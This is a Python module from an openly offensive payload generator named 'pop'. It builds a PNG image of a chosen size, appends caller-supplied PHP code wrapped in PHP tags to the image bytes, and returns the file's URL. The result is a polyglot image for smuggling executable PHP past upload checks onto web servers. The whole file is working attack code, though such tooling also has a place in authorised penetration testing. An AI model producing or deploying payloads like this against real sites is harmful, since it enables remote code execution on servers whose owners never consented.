#
# pop is an offensive payload generator
# Copyright 2021-2022 Philippe Grégoire <git@pgregoire.xyz>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
#

import os
from PIL import Image


USAGE = 'W H php-code'
NARGS = [3, 0]
LANG = 'png'
EXEC = ''

pl = ''


def g(s, args, dst, url):
    php = ' '.join(args[2:]).strip()
    if ';' != php[-1]:
        php += ';'
    php = '<?php {}?>'.format(php).encode()

    img = os.path.join(dst, 'img.png')
    png = Image.new('RGB', (int(args[0]), int(args[1])), color='black')
    png.save(img)

    with open(img, 'rb') as fp:
        png = fp.read()
    with open(img, 'wb') as fp:
        fp.write(png + php)

    return url + 'img.png'
